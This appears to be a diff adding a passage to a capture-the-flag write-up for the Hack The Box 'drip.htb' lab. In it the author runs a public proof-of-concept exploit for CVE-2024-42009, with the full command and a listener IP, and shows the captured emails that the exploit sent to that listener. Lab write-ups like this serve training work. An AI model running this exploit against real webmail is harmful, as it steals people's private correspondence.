@@ -108,3 +108,28 @@ https://github.com/Bhanunamikaze/CVE-2024-42009/blob/main/exploit.py
 
 Ill try this POC script
 
+```python
+python3 exploit.py -fu ethan@drip.htb -tu bcase@drip.htb -u http://drip.htb/contact -ip 10.10.14.61 -p 80
+[*] CVE-2024-42009 PoC: Listening on 10.10.14.61:80...
+
+
+[+] Captured Email Content:
+Hi bcase,
+Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
+support@drip.htb
+.
+
+[+] Captured Email Content:
+Hey Bryce,
+The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
+You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
+If you encounter any issues or have feedback, let me know so I can address them promptly.
+Thanks
+
+[+] Captured Email Content:
+
+^C
+[!] Stopping...
+```
+
+As seen here it allows me to exfil the users emails. It gives me info
